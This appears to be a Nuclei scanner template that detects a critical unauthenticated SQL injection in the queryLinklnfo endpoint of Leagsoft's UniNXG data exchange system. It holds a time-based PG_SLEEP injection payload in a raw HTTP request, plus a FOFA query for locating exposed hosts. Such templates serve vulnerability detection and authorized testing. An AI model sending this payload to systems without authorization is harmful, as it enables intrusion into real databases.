http:
- matchers:
  - dsl:
    - duration>=5
    type: dsl
  raw:
  - '@timeout: 10s

    GET /UniExServices/link/queryLinklnfo?address=%27%3BSELECT%20PG_SLEEP%285%29--
    HTTP/1.1

    Host: {{Hostname}}

    '
id: leagsoft-uninxg-querylinkinfo-sqli
info:
  author: Co5mos
  description: 'UniNXG Security Data Exchange System''s `queryLinklnfo` endpoint has
    an SQL injection vulnerability that allows attackers to execute arbitrary SQL
    commands. Unauthenticated attackers can exploit this vulnerability to retrieve
    database user data.

    '
  metadata:
    fofa-query: "body=\"\u6DF1\u5733\u5E02\u8054\u8F6F\u79D1\u6280\u80A1\u4EFD\u6709\
      \u9650\u516C\u53F8\""
  name: Leagsoft UniNXG Security Data Exchange System queryLinklnfo SQL Injection
  severity: critical
  tags: uninxg, sqli, leagsoft
